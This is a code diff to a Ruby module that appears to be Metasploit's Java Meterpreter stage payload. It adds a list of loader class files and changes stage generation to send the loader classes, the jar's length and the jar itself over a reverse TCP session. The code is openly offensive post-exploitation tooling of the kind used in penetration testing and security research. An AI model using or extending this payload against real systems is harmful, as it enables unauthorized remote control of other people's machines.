@@ -10,6 +10,7 @@
 ##
 
 require 'msf/core'
+require 'msf/core/payload/java'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/meterpreter_java'
 require 'msf/base/sessions/meterpreter_options'
@@ -17,6 +18,8 @@ require 'msf/base/sessions/meterpreter_options'
 
 module Metasploit3
 	include Msf::Sessions::MeterpreterOptions
+
+	include Msf::Payload::JavaStage
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -31,6 +34,21 @@ module Metasploit3
 			'Arch'          => ARCH_JAVA,
 			'License'       => MSF_LICENSE,
 			'Session'       => Msf::Sessions::Meterpreter_Java_Java))
+		# Order matters.  Classes can only reference classes that have already
+		# been sent.  The last .class must implement Stage, i.e. have a start()
+		# method.
+		#
+		# The Meterpreter.class stage is just a jar loader, not really anything
+		# to do with meterpreter specifically.  This payload should eventually
+		# be replaced with an actual meterpreter stage so we don't have to send
+		# a jar.
+		@class_files = [
+			[ "javapayload", "stage", "Stage.class" ],
+			[ "com", "metasploit", "meterpreter", "MemoryBufferURLConnection.class" ],
+			[ "com", "metasploit", "meterpreter", "MemoryBufferURLStreamHandler.class" ],
+			# Must be last!
+			[ "javapayload", "stage", "Meterpreter.class" ],
+		]
 	end
 
 	def generate_stage
@@ -38,7 +56,11 @@ module Metasploit3
 		met = File.open(file, "rb") {|f|
 			f.read(f.stat.size)
 		}
-		met
+
+		# All of the dendencies to create a jar loader, followed by the length
+		# of the jar and the jar itself.
+		super + [met.length].pack("N") + met
 	end
+
 end
 
